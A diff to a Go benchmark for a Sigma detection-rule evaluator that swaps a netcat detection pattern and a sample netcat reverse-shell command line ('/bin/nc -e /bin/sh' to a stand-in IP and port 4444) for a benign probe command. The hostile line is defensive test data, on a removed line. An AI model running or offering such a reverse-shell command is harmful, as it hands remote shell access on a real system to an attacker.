@@ -136,7 +136,7 @@ func BenchmarkSigmaEval(b *testing.B) {
 		`level: high`,
 		`detection:`,
 		`  sel:`,
-		`    CommandLine|contains: "/bin/nc"`,
+		`    CommandLine|contains: "/opt/raksa/bench_probe"`,
 		`    SourceIp|cidr: "198.51.100.0/24"`,
 		`  condition: sel`,
 	}, "\n")
@@ -149,7 +149,7 @@ func BenchmarkSigmaEval(b *testing.B) {
 		ID:        "b1",
 		Timestamp: time.Now().UTC(),
 		SrcIP:     "198.51.100.66",
-		Metadata:  map[string]any{"command_line": "/bin/nc -e /bin/sh 198.51.100.66 4444"},
+		Metadata:  map[string]any{"command_line": "/opt/raksa/bench_probe --target 198.51.100.66 --port 4444"},
 	}
 	b.ResetTimer()
 	b.ReportAllocs()
